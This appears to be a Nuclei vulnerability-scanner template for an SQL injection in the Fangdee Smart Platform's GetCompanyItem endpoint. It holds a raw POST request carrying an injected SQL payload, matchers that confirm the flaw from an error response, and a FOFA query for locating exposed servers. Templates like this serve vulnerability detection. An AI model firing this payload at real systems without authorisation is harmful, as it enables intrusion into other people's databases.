id: ftyun-getcompanyitem-sqli

info:
  name: 方天云智慧平台系统 GetCompanyItem - sqli
  author: leadlife
  severity: high
  description: Fangdee Smart Platform system's `GetCompanyItem` endpoint has an SQL injection vulnerability that allows attackers to execute arbitrary SQL commands.
  metadata:
    verified: true
    fofa-query: body="AjaxMethods.asmx/GetCompanyItem"
  tags: ftyun, sqli

http:
  - raw:
      - |
        POST /AjaxMethods.asmx/GetCompanyItem HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        X-Requested-With: XMLHttpRequest

        {"cusNumber":"1' and 2=user--+"}

    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains(body, 'SmartSoft.Web.AjaxMethods.GetCompanyItem')
        condition: and